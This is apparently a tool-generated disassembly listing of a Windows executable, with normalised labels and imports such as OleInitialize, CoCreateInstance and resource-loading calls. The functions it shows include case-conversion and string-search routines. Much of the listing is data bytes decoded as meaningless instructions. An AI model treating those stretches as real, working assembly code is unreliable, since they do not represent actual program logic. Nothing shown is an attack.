dec ebx
add [ ebx - 0xbda0040 ] cl
pushad
dec ebx
add [ ebx - 0xfda0040 ] cl
pushad
dec ebx
add [ ebx - 0x13da0040 ] cl
pushad
dec ebx
add [ ebx - 0x17da0040 ] cl
pushad
dec ebx
add [ ebx - 0x1bda0040 ] cl
pushad
dec ebx
add [ ebx - 0x1fda0040 ] cl
pushad
dec ebx
add [ ebx - 0x23da0040 ] cl
pushad
dec ebx
add [ ebx - 0x27da0040 ] cl
pushad
dec ebx
add [ ebx - 0x2bda0040 ] cl
pushad
dec ebx
add [ ebx - 0x2fda0040 ] cl
pushad
dec ebx
add [ ebx - 0x33da0040 ] cl
pushad
dec ebx
add [ ebx - 0x37da0040 ] cl
pushad
dec ebx
add [ ebx - 0x3bda0040 ] cl
pushad
dec ebx
add [ ebx - 0x3fda0040 ] cl
pushad
dec ebx
add [ ebx - 0x43da0040 ] cl
pushad
dec ebx
add [ ebx - 0x47da0040 ] cl
pushad
dec ebx
add [ ebx - 0x4bda0040 ] cl
pushad
dec ebx
add [ ebx - 0x4fda0040 ] cl
pushad
dec ebx
add [ ebx - 0x53da0040 ] cl
pushad
dec ebx
add [ ebx - 0x57da0040 ] cl
pushad
dec ebx
add [ ebx - 0x5bda0040 ] cl
pushad
dec ebx
add [ ebx - 0x5fda0040 ] cl
pushad
dec ebx
add [ ebx - 0x63da0040 ] cl
pushad
dec ebx
add [ ebx - 0x67da0040 ] cl
pushad
dec ebx
add [ ebx - 0x6bda0040 ] cl
pushad
dec ebx
add [ ebx - 0x6fda0040 ] cl
pushad
dec ebx
add [ ebx - 0x73da0040 ] cl
pushad
dec ebx
add [ ebx + 0x4b1c40c0 ] cl
add al dh
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add cl dh
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add dl dh
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add bl dh
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add ah dh
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add ch dh
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add dh dh
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add bh dh
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add al bh
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add cl bh
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add dl bh
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add bl bh
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add ah bh
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add ch bh
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add dh bh
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add bh bh
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add al ah
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add cl ah
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add dl ah
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add bl ah
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add ah ah
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add ch ah
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add dh ah
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add bh ah
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add al ch
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add cl ch
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add dl ch
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add bl ch
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add ah ch
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add ch ch
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add dh ch
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add bh ch
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add al dl
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add cl dl
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add dl dl
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add bl dl
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add ah dl
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add ch dl
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add dh dl
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add bh dl
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add al bl
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add cl bl
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add dl bl
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add bl bl
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add ah bl
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add ch bl
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add dh bl
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add bh bl
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add al al
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add cl al
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add dl al
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add bl al
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add ah al
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add ch al
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add dh al
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add bh al
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add al cl
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add cl cl
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add dl cl
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add bl cl
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add ah cl
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add ch cl
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add dh cl
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add bh cl
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add [ eax + 0x400000ff ] dh
sbb al 0x4b
add [ ecx + 0x400000ff ] dh
sbb al 0x4b
add [ edx + 0x400000ff ] dh
sbb al 0x4b
add [ ebx + 0x400000ff ] dh
sbb al 0x4b
add [ edi + edi * 8 + 0x1c400000 ] dh
dec ebx
add [ ebp + 0x400000ff ] dh
sbb al 0x4b
add [ esi + 0x400000ff ] dh
sbb al 0x4b
add [ edi + 0x400000ff ] dh
sbb al 0x4b
add [ eax + 0x400000ff ] bh
sbb al 0x4b
add [ ecx + 0x400000ff ] bh
sbb al 0x4b
add [ edx + 0x400000ff ] bh
sbb al 0x4b
add [ ebx + 0x400000ff ] bh
sbb al 0x4b
add [ edi + edi * 8 + 0x1c400000 ] bh
dec ebx
add [ ebp + 0x400000ff ] bh
sbb al 0x4b
add [ esi + 0x400000ff ] bh
sbb al 0x4b
add [ edi + 0x400000ff ] bh
sbb al 0x4b
add [ eax + 0x400000ff ] ah
sbb al 0x4b
add [ ecx + 0x400000ff ] ah
sbb al 0x4b
add [ edx + 0x400000ff ] ah
sbb al 0x4b
add [ ebx + 0x400000ff ] ah
sbb al 0x4b
add [ edi + edi * 8 + 0x1c400000 ] ah
dec ebx
add [ ebp + 0x400000ff ] ah
sbb al 0x4b
add [ esi + 0x400000ff ] ah
sbb al 0x4b
add [ edi + 0x400000ff ] ah
sbb al 0x4b
add [ eax + 0x400000ff ] ch
sbb al 0x4b
add [ ecx + 0x400000ff ] ch
sbb al 0x4b
add [ edx + 0x400000ff ] ch
sbb al 0x4b
add [ ebx + 0x400000ff ] ch
sbb al 0x4b
add [ edi + edi * 8 + 0x1c400000 ] ch
dec ebx
add [ ebp + 0x400000ff ] ch
sbb al 0x4b
add [ esi + 0x400000ff ] ch
sbb al 0x4b
add [ edi + 0x400000ff ] ch
sbb al 0x4b
add [ eax + 0x400000ff ] dl
sbb al 0x4b
add [ ecx + 0x400000ff ] dl
sbb al 0x4b
add [ edx + 0x400000ff ] dl
sbb al 0x4b
add [ ebx + 0x400000ff ] dl
sbb al 0x4b
add [ edi + edi * 8 + 0x1c400000 ] dl
dec ebx
add [ ebp + 0x400000ff ] dl
sbb al 0x4b
add [ esi + 0x400000ff ] dl
sbb al 0x4b
add [ edi + 0x400000ff ] dl
sbb al 0x4b
add [ eax + 0x400000ff ] bl
sbb al 0x4b
add [ ecx + 0x400000ff ] bl
sbb al 0x4b
add [ edx + 0x400000ff ] bl
sbb al 0x4b
add [ ebx + 0x400000ff ] bl
sbb al 0x4b
add [ edi + edi * 8 + 0x1c400000 ] bl
dec ebx
add [ ebp + 0x400000ff ] bl
sbb al 0x4b
add [ esi + 0x400000ff ] bl
sbb al 0x4b
add [ edi + 0x400000ff ] bl
sbb al 0x4b
add [ eax + 0x400000ff ] al
sbb al 0x4b
add [ ecx + 0x400000ff ] al
sbb al 0x4b
add [ edx + 0x400000ff ] al
sbb al 0x4b
add [ ebx + 0x400000ff ] al
sbb al 0x4b
add [ edi + edi * 8 + 0x1c400000 ] al
dec ebx
add [ ebp + 0x400000ff ] al
sbb al 0x4b
add [ esi + 0x400000ff ] al
sbb al 0x4b
add [ edi + 0x400000ff ] al
sbb al 0x4b
add [ eax + 0x400000ff ] cl
sbb al 0x4b
add [ ecx + 0x400000ff ] cl
sbb al 0x4b
add [ edx + 0x400000ff ] cl
sbb al 0x4b
add [ ebx + 0x400000ff ] cl
sbb al 0x4b
add [ edi + edi * 8 + 0x1c400000 ] cl
dec ebx
add [ ebp + 0x400000ff ] cl
sbb al 0x4b
add [ esi + 0x400000ff ] cl
sbb al 0x4b
add [ edi + 0x400000ff ] cl
sbb al 0x4b
add [ eax - 0x1 ] dh
add [ eax ] al
inc eax
sbb al 0x4b
add [ ecx - 0x1 ] dh
add [ eax ] al
inc eax
sbb al 0x4b
add [ edx - 0x1 ] dh
add [ eax ] al
inc eax
sbb al 0x4b
add [ ebx - 0x1 ] dh
add [ eax ] al
inc eax
sbb al 0x4b
add [ edi + edi * 8 ] dh
add [ eax + 0x1c ] al
dec ebx
add [ ebp - 0x1 ] dh
add [ eax ] al
inc eax
sbb al 0x4b
add [ esi - 0x1 ] dh
add [ eax ] al
inc eax
sbb al 0x4b
add [ edi - 0x1 ] dh
add [ eax ] al
inc eax
sbb al 0x4b
add [ eax - 0x1 ] bh
add [ eax ] al
inc eax
sbb al 0x4b
add [ ecx - 0x1 ] bh
add [ eax ] al
inc eax
sbb al 0x4b
add [ edx - 0x1 ] bh
add [ eax ] al
inc eax
sbb al 0x4b
add [ ebx - 0x1 ] bh
add [ eax ] al
inc eax
sbb al 0x4b
add [ edi + edi * 8 ] bh
add [ eax + 0x1c ] al
dec ebx
add [ ebp - 0x1 ] bh
add [ eax ] al
inc eax
sbb al 0x4b
add [ esi - 0x1 ] bh
add [ eax ] al
inc eax
sbb al 0x4b
add [ edi - 0x1 ] bh
add [ eax ] al
inc eax
sbb al 0x4b
add [ eax - 0x1 ] ah
add [ eax ] al
inc eax
sbb al 0x4b
add [ ecx - 0x1 ] ah
add [ eax ] al
inc eax
sbb al 0x4b
add [ edx - 0x1 ] ah
add [ eax ] al
inc eax
sbb al 0x4b
add [ ebx - 0x1 ] ah
add [ eax ] al
inc eax
sbb al 0x4b
add [ edi + edi * 8 ] ah
add [ eax + 0x1c ] al
dec ebx
add [ ebp - 0x1 ] ah
add [ eax ] al
inc eax
sbb al 0x4b
add [ esi - 0x1 ] ah
add [ eax ] al
inc eax
sbb al 0x4b
add [ edi - 0x1 ] ah
add [ eax ] al
inc eax
sbb al 0x4b
add [ eax - 0x1 ] ch
add [ eax ] al
inc eax
sbb al 0x4b
add [ ecx - 0x1 ] ch
add [ eax ] al
add al 0xfb
sub al 0x5
jae r-xdata
adc [ ecx + 0x4b ] ah
inc esi
add [ edx ] al
or dh [ eax + 0x76 ]
jae r-xdata
js r-xdata
jb r-xdata
and eax OleInitialize@IAT
mov eax eax
add al [ eax ]
adc al [ eax ]
sbb al 0x0
add [ eax ] al
add al [ eax ]
pushfd
jo r-xdata
add al [ gs : eax ]
add al [ eax ]
lea eax [ eax ]
arpl [ edi + 0x64 ] bp
imul ebp [ edi + 0x6e ] 0x12500002
inc eax
add [ eax + eax ] cl
add [ eax ] al
add cl [ edx ]
jae r-xdata
sar bh 0x25
and [ eax + 0x4b ] 0x0
mov eax eax
jmp [ CoCreateInstance@IAT ]
jb r-xdata
jb r-xdata
insb
jo r-xdata
jb r-xdata
insb
jo r-xdata
imul ebp [ ebp + 0x2 ] 0x40109c00
add [ eax ] dl
add [ eax ] al
add [ edx ] al
or eax 0x65487764
mov eax eax
imul ebp [ esp + ebp * 2 + 0x49 ] 0x9c00026e
inc esi
sub_40d310
push ebx
mov ebx eax
mov eax ebx
call sub_40d304
test al al
jne r-xdata
mov eax ebx
call sub_40d404
test al al
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
or bx 0x20
cmp bx 0x61
jb r-xdata
movzx eax bl
movzx eax [ eax + rw-data ]
call sub_40d2e8
jmp r-xdata
movzx eax bx
mov edx eax
shr edx 0x8
mov ecx [ rw-data ]
movzx edx [ ecx + edx * 2 ]
mov ecx eax
shr ecx 0x4
and ecx 0xf
add edx ecx
mov ecx [ rw-data ]
movzx edx [ ecx + edx * 2 ]
and eax 0xf
add edx eax
mov eax [ rw-data ]
movzx eax [ eax + edx ]
call sub_40d2e8
pop ebx
retn
call sub_40d470
xor eax eax
jmp r-xdata
cmp bx 0x7a
jbe r-xdata
pop ebx
retn
mov al 0x1
sub_40d39c
push ebx
mov ebx eax
mov eax ebx
call sub_40d304
test al al
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
movzx eax bl
movzx eax [ eax + rw-data ]
call sub_40d2f4
pop ebx
retn
movzx eax bx
mov edx eax
shr edx 0x8
mov ecx [ rw-data ]
movzx edx [ ecx + edx * 2 ]
mov ecx eax
shr ecx 0x4
and ecx 0xf
add edx ecx
mov ecx [ rw-data ]
movzx edx [ ecx + edx * 2 ]
and eax 0xf
add edx eax
mov eax [ rw-data ]
movzx eax [ eax + edx ]
call sub_40d2f4
pop ebx
retn
call sub_40d470
sub_40d410
push ebx
mov ebx eax
mov eax ebx
call sub_40d304
test al al
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
movzx eax bl
movzx eax [ eax + rw-data ]
pop ebx
retn
movzx eax bx
mov edx eax
shr edx 0x8
mov ecx [ rw-data ]
movzx edx [ ecx + edx * 2 ]
mov ecx eax
shr ecx 0x4
and ecx 0xf
add edx ecx
mov ecx [ rw-data ]
movzx edx [ ecx + edx * 2 ]
and eax 0xf
add edx eax
mov eax [ rw-data ]
movzx eax [ eax + edx ]
pop ebx
retn
call sub_40d470
sub_40d470
push ebx
push esi
mov esi rw-data
push 0xa
push r-xdata
mov eax [ rw-data ]
push eax
call FindResourceW
mov ebx eax
test ebx ebx
jne r-xdata
push ebx
mov eax [ rw-data ]
push eax
call LoadResource
mov ebx eax
test ebx ebx
jne r-xdata
call sub_4184b8
push ebx
call LockResource
mov [ esi ] eax
cmp [ esi ] 0x0
jne r-xdata
call sub_4184b8
mov eax [ esi ]
mov edx [ esi ]
mov ecx edx
add ecx [ eax ]
mov [ rw-data ] ecx
mov ecx edx
add ecx [ eax + 0x4 ]
mov [ rw-data ] ecx
mov ecx edx
add ecx [ eax + 0x8 ]
mov [ rw-data ] ecx
mov ecx edx
add ecx [ eax + 0xc ]
mov [ rw-data ] ecx
mov ecx edx
add ecx [ eax + 0x10 ]
mov [ rw-data ] ecx
add edx [ eax + 0x14 ]
mov [ rw-data ] edx
pop esi
pop ebx
retn
call sub_4184b8
sub_40d518
test eax eax
je r-xdata
xor eax eax
retn
test edx edx
je r-xdata
dec ecx
jl r-xdata
push esi
push ebx
push 0x0
push 0x0
mov esi ecx
cmp [ eax - 0xa ] 0x2
je r-xdata
cmp [ edx - 0xa ] 0x2
je r-xdata
push edx
mov edx eax
lea eax [ esp + 0x4 ]
call sub_4072ac
pop edx
mov eax [ esp ]
mov ecx esi
mov esi [ edx - 0x4 ]
mov ebx [ eax - 0x4 ]
sub esi ecx
shl ecx 0x1
add edx ecx
cmp esi ebx
jl r-xdata
push eax
lea eax [ esp + 0x8 ]
call sub_4072ac
pop eax
mov edx [ esp + 0x4 ]
mov eax [ esp ]
or eax [ esp + 0x4 ]
je r-xdata
test ebx ebx
jle r-xdata
add esp 0x8
pop ebx
pop esi
mov eax esp
mov edx 0x2
call j_sub_4068c4
add esp 0xfffffff4
add ebx 0xffffffff
shl esi 0x1
add esi edx
shl ebx 0x1
add edx ebx
mov [ esp + 0x8 ] esi
add eax ebx
sub ecx edx
neg ebx
mov [ esp + 0x4 ] ecx
mov [ esp ] ebx
movzx ecx [ eax ]
add edx 0xfffffffe
cmp cx [ edx + 0x2 ]
je r-xdata
mov eax [ esp + 0x4 ]
add edx 0x4
cmp edx [ esp + 0x8 ]
ja r-xdata
mov ebx [ eax + esi ]
cmp ebx [ edx + esi + 0x2 ]
jne r-xdata
mov esi [ esp ]
test esi esi
je r-xdata
add edx 0x8
cmp edx [ esp + 0x8 ]
jb r-xdata
add esp 0xc
add esp 0xc
mov ecx [ esp ]
or ecx [ esp + 0x4 ]
je r-xdata
cmp esi 0xfffffffc
jge r-xdata
cmp cx [ edx - 0x4 ]
je r-xdata
add edx 0xfffffffc
cmp edx [ esp + 0x8 ]
jb r-xdata
add eax edx
shr eax 0x1
add esp 0x8
pop ebx
pop esi
retn
mov ebx eax
mov esi edx
mov eax esp
mov edx 0x2
call j_sub_4068c4
mov eax ebx
mov edx esi
mov ebx [ eax + esi + 0x4 ]
cmp ebx [ edx + esi + 0x6 ]
jne r-xdata
add edx 0xfffffffc
cmp cx [ edx - 0x2 ]
jne r-xdata
cmp cx [ edx ]
je r-xdata
add esi 0x8
jl r-xdata
add edx 0x2
sub_40d690
push cs
or dl [ ebx + edx * 2 + 0x65 ]
popad
jb r-xdata
inc ebp
js r-xdata
push 0x70636552
add al [ eax ]
add [ ecx ] al
add [ eax ] al
add [ eax - 0x2a ] bh
inc eax
add [ eax + eax ] dl
add [ eax ] al
add [ edi ] al
add [ eax ] al
add [ eax + edx + 0x40 ] bl
add [ eax ] al
add al [ esp + edx * 2 ]
imul ebp [ ebp + 0x65 ] 0x11140002
inc eax
add [ eax ] cl
add [ eax ] al
add [ edx ] al
add al 0x53
imul edi [ edx + 0x65 ] 0x109c0002
inc eax
add [ eax ] dl
add [ eax ] al
add [ edx ] al
add al 0x41
je r-xdata
arpl [ gs : edi + 0x72 ] bp
insb
jne r-xdata
inc eax
jb r-xdata
add al [ eax ]
add [ eax ] al
add [ eax ] al
adc al 0x0
imul ebp [ edi + 0x6e ] 0x65646f43
add al [ eax ]
clc
adc [ eax ] al
add al 0x0
add [ eax ] al
add cl [ esi ]
push eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ eax ] al
add [ eax ] al
clc
adc [ eax ] al
add [ eax ] al
inc ecx
je r-xdata
add [ eax ] al
add dl [ eax ]
inc ebp
js r-xdata
outsd
outsb
push edx
salc
inc eax
add [ eax + eax ] dl
add [ eax ] al
add al [ esi + ecx * 2 ]
popad
insd
add al [ gs : eax ]
pushfd
adc [ eax ] al
sbb [ eax ] al
add [ eax ] al
add cl [ ebx ]
add [ eax - 0x2a ] bh
add [ esp + edx ] bh
outsd
outsb
dec ecx
outsb
outsw
add [ eax ] al
add dl [ eax * 2 + 0x70656378 ]
je r-xdata
add [ eax + eax ] dl
jo r-xdata
add [ eax ] al
add cl [ 0x65637845 ]
jo r-xdata
jb r-xdata
inc eax
add [ eax ] bl
add [ eax ] al
add [ edx ] al
or al 0x45
js r-xdata
jo r-xdata
add bl bl
fld [ eax ]
inc esp
add ah dh
popad
add al [ gs : bx + si ]
add [ eax + edx + 0x80040 ] bl
add [ eax ] al
or al 0x46
dec eax
insb
jo r-xdata
add [ eax ] dl
inc ecx
add [ eax - 0x2fffbfa8 ] dh
popad
je r-xdata
jb r-xdata
imul ebp [ edi + 0x6e ] 0x67616c46
jae r-xdata
adc [ eax ] al
sbb al 0x0
add [ eax ] al
add cl [ edx ]
inc esi
imul ebp [ esi + 0x64 ] 0x646e6148
insb
add al [ gs : eax ]
mov ah 0xb0
inc eax
add [ eax ] ah
add [ eax ] al
add [ edx ] al
or [ esi + 0x69 ] al
outsb
inc esp
popad
je r-xdata
add al bh
add [ esi ] dl
inc ecx
add [ eax + 0x58004166 ] bh
inc cx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
jo r-xdata
inc eax
add [ esi + edx * 2 + 0x56b40040 ] ch
add al [ eax ]
imul ebp [ edi + 0x6e ] 0x72646441
jae r-xdata
inc esi
inc ecx
arpl [ ecx + 0x75 ] si
imul esi [ edx + 0x65 ] 0x656e6e49
jb r-xdata
outsd
outsb
je r-xdata
inc eax
outsd
xlat
inc eax
add [ eax ] cl
add [ eax ] al
add [ edx ] al
cmovne edi [ eax + 0x63 ]
add [ edi + edx * 8 ] dh
inc ebp
js r-xdata
add [ eax ] al
add [ edx ] al
push cs
add al [ eax ]
add al [ eax ]
cmp bh dl
inc eax
add [ eax + edx ] dl
push eax
inc ebp
js r-xdata
add [ eax ] al
add [ eax + 0x12 ] al
inc eax
add [ eax + eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax 0x12400000
inc eax
add [ eax + eax ] al
add [ eax ] al
or [ esi + 0x4d ] al
jae r-xdata
add al [ eax ]
lea eax [ eax ]
movsb [ edi ] [ esi ]
fadd [ eax ]
add [ eax ] al
dec edi
inc eax
add [ esi + 0x450040d8 ] bh
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
clc
adc [ eax ] al
adc [ eax ] al
add [ eax ] al
add dl [ eax ]
dec esi
jne r-xdata
dec [ eax ]
fild [ eax ]
inc esp
add ah dh
[ ebx + ebx * 8 ]
inc eax
add [ eax + eax - 0xc ] al
[ esi - 0x25 ]
js r-xdata
[ esi ]
fiadd [ eax ]
inc esp
add ah dh
call [ esi - 0x26 ]
inc eax
inc eax
add [ eax + eax - 0xc ] al
js r-xdata
pop eax
inc eax
add ah dl
pop eax
inc eax
jo r-xdata
jb r-xdata
imul ebp [ edi + 0x6e ] 0x6f636552
jb r-xdata
popad
jae r-xdata
jo r-xdata
add [ eax + ebx * 8 - 0x231bffc0 ] ch
bound esp [ ebp + 0x72 ]
push eax
popad
jb r-xdata
jo r-xdata
add [ eax + eax - 0xc ] al
add al [ eax ]
add al ah
fadd [ eax ]
or al 0x0
add [ eax ] al
cmovbe ecx [ ecx + 0x6e ]
outsb
jb r-xdata
push ebp
inc eax
inc ecx
adc [ eax ] al
sbb [ eax ] al
add [ eax ] al
add cl [ eax * 2 + 0x70656378 ]
je r-xdata
add ah ah
inc ebp
js r-xdata
add al [ eax ]
je r-xdata
imul ebp [ edi + 0x6e ] 0x6f636552
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
lodsb [ esi ]
fadd [ eax ]
in al 0xdc
insd
je r-xdata
add [ edx ] cl
add [ eax ] eax
dec esp
fadd [ eax ]
dec edx
add bh dh
dec [ esi ]
fiadd [ eax ]
inc esp
add ah dh
imul ebp [ edi + 0x6e ] 0x2
adc [ eax ] eax
fcmovnu st1
inc eax
add [ eax + eax - 0xc ] al
js r-xdata
add al bl
pop eax
inc eax
add ah cl
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
bound ebp [ edx + 0x65 ]
arpl [ edx + eax ] si
add [ edx ] al
or al [ ebp + 0x78 ]
arpl [ ebp + 0x70 ] sp
je r-xdata
in al 0x10
inc eax
add [ eax + eax ] cl
outsd
outsb
push edx
arpl [ gs : edi + 0x72 ] bp
add al [ fs : eax ]
add cl [ edi ]
inc ebp
js r-xdata
add [ esi ] cl
adc [ ebp + eax * 2 + 0x78 ] dl
arpl [ ebp + 0x70 ] sp
je r-xdata
push eax
xlat
inc eax
add [ edx ] al
add [ edi + edx * 8 + 0x40 ] dl
fld [ eax ]
add [ eax ] al
inc eax
add ah ah
fadd [ eax ]
mov esi 0x450040d8
jb r-xdata
call [ ebp + 0x440040da ]
add ah dh
[ eax + 0x440040da ]
jo r-xdata
add [ eax ] al
cmp al 0x14
add cl dl
fld [ eax ]
sbb al 0x0
outsb
add al [ eax ]
in al 0x10
inc eax
add [ eax + eax ] dl
add [ eax ] al
add cl [ edx ]
jo r-xdata
add [ eax ] al
rcr ecx 0x1
inc eax
add [ eax + eax ] bl
add [ eax + eax - 0xc ] al
imul ebp [ edi + 0x6e ] 0xe4000002
adc [ eax ] al
adc [ eax ] al
add [ eax ] al
or al [ esi + 0x53 ]
je r-xdata
arpl [ ebx + 0x49 ] bp
outsb
outsw
add al [ eax ]
add [ eax ] al
adc [ eax ] al
adc al 0x0
add [ eax ] al
push ss
sub_40e8b2
inc eax
add ah cl
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add [ esi ] dl
inc ecx
add [ eax + 0x58004166 ] bh
inc cx
add [ edx ] cl
inc ebp
push ebp
outsb
jb r-xdata
inc ecx
insb
outsd
ja r-xdata
add [ eax + ebx * 8 + 0x40 ] cl
add [ esi + edx * 2 + 0x56b40040 ] ch
inc eax
add [ eax ] dl
inc ecx
add [ eax - 0x2fffbfa8 ] dh
pop eax
inc eax
insb
imul esp [ eax + edx * 2 + 0x6f ] 0x65746e69
jb r-xdata
add [ eax ] al
add al [ eax ]
fsub st0
inc eax
add [ edi ] al
or al [ ebp + 0x55 ]
outsb
jb r-xdata
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add [ esi ] dl
inc ecx
add [ eax + 0x58004166 ] bh
inc cx
add [ eax * 2 + 0x61766e49 ] cl
insb
imul esp [ ebx + eax * 2 + 0x61 ] 0x408d7473
add [ eax ] bl
0xc070040 0x4945
jmp 0xf47e9ba
add ah cl
pop eax
inc eax
add [ eax + 0x68004055 ] cl
inc ecx
add [ esi ] dl
inc ecx
add [ edi + 0x41 ] dh
add [ eax + 0x66 ] bl
insb
outsd
ja r-xdata
pop eax
inc eax
add al bl
pop eax
call 0xffffffffe6bce92e
inc eax
add [ eax ] al
add [ eax ] cl
push ebx
jns r-xdata
popad
push ebp
je r-xdata
inc ecx
add [ edi ] cl
inc ebp
dec ecx
outsb
jbe r-xdata
insb
jae r-xdata
add [ eax ] al
add [ edx ] al
add [ ebp - 0x16a3ffc0 ] cl
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x17 ] bh
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebp * 8 + 0x40 ] ah
add [ eax ] ah
add [ eax ] al
add [ eax ] cl
loopne r-xdata
imul ebp [ esi + 0x74 ] 0xe9787265
inc eax
add [ edi ] al
cmovne ecx [ ecx + 0x6e ]
jbe r-xdata
add [ eax - 0x2fffbfa8 ] dh
pop eax
inc eax
add ah dl
pop eax
inc eax
add al bl
pop eax
inc eax
add [ esi + edx * 2 + 0x56b40040 ] ch
inc eax
add [ eax ] dl
inc ecx
add ah dl
pop eax
rcr [ eax + 0x40 ] 0x1
insb
imul esp [ eax + edx * 2 + 0x6f ] 0x65746e69
jb r-xdata
inc eax
add al bl
pop eax
inc eax
add ah cl
jmp 0xffffffffe10ce9cf
sub_40ea44
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov ah 0xea
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1c0040ea ] ah
mov ah 0x56
inc eax
add [ eax ] dl
inc ecx
add [ eax - 0x2fffbfa8 ] dh
pop eax
inc eax
add ah dl
jb r-xdata
add [ eax - 0x2fffbfa8 ] dh
pop eax
inc eax
add ah dl
pop eax
inc eax
add al bl
pop eax
inc eax
add ah cl
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add [ esi ] dl
inc ecx
add [ eax + 0x58004166 ] bh
inc cx
add [ edx ] cl
inc ebp
push eax
push esi
imul ebp [ edi + 0x6c ] 0x6f697461
outsb
lea eax [ eax ]
push esp
jmp r-xdata
pop eax
inc ebp
jb r-xdata
inc ecx
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
jmp r-xdata
inc eax
add al bl
outsd
jb r-xdata
add [ eax ] al
push eax
loop r-xdata
arpl [ ebx + 0x4f ] bp
jbe r-xdata
pop eax
inc eax
add ah dl
pop eax
inc eax
add al bl
pop eax
inc eax
add ah cl
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add [ esi ] dl
inc ecx
add [ eax + 0x58004166 ] bh
inc cx
mov al 0x58
inc eax
add al dl
insb
nop
jb r-xdata
add [ eax ] al
add [ edx ] al
add [ eax + r-xdata ] dl
shl [ edx + ebp * 8 + 0xd070040 ] 0x45
inc ebx
outsd
outsb
jbe r-xdata
shr [ eax ] 0xed
add [ esi + edx * 2 + 0x56b40040 ] ch
add [ eax - 0x2fffbfa8 ] dh
add [ esi + edx * 2 + 0x67100040 ] dh
inc ecx
jb r-xdata
pop eax
inc eax
add ah cl
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
